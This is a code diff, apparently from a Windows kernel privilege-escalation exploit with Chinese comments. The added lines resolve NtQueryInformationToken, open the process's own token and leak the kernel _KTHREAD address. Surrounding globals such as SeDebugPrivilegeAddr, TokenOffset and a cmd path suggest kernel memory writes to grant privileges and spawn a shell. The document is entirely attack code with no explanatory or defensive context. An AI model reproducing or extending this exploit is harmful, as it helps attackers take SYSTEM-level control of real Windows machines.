@@ -5,6 +5,7 @@
 extern pNtWriteVirtualMemory NtWriteVirtualMemory;
 extern pNtReadVirtualMemory NtReadVirtualMemory;
 extern pNtQuerySystemInformation NtQuerySystemInfor;
+extern pNtQueryInformationToken NtQueryInfoToken;
 
 extern LPCWSTR wCmdPath;
 extern LPCSTR CmdPath;
@@ -19,6 +20,7 @@ HMODULE NTOUserBase;
 DWORD64 SeDebugPrivilegeAddr;
 DWORD64 SeDebugPrivilegeAddrOffset;
 DWORD64 TokenOffset;
+DWORD64 kThreadAddr;
 
 int main()
 {
@@ -28,7 +30,7 @@ int main()
     printf("[*] OS Version: %d.%d.%d.%d\n",
         OSVersion.MajorVersion, OSVersion.MinorVersion, OSVersion.BuildNumber, OSVersion.RevisionNumber);
 
-    HANDLE hCurrentProc = GetCurrentProcess(); // 获取当前进程句柄
+    HANDLE hCurrentProc = GetCurrentProcess(); // 获取当前进程句柄（伪句柄）
     DWORD CurrentPid = GetCurrentProcessId(); // 获取当前进程pid
 
     HMODULE ntdll = GetModuleHandleA("ntdll");
@@ -38,6 +40,13 @@ int main()
     NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
     NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
     NtQuerySystemInfor = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
+    NtQueryInfoToken = (pNtQueryInformationToken)GetProcAddress(ntdll, "NtQueryInformationToken");
+
+    HANDLE hToken;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);    
+    kThreadAddr = (DWORD64)GetKernelPointerByHandle(hToken, CurrentPid);
+    printf("[+] _KTHREAD: %llx\n", kThreadAddr);
+    CloseHandle(hToken);
 
     NTOKernelBase = GetModuleAddrByName(NtoRootPath);
     NTOUserBase = GetModuleByName(wNtoPath);
@@ -63,3 +72,4 @@ int main()
 
     FreeLibrary(NTOUserBase);
 }
+
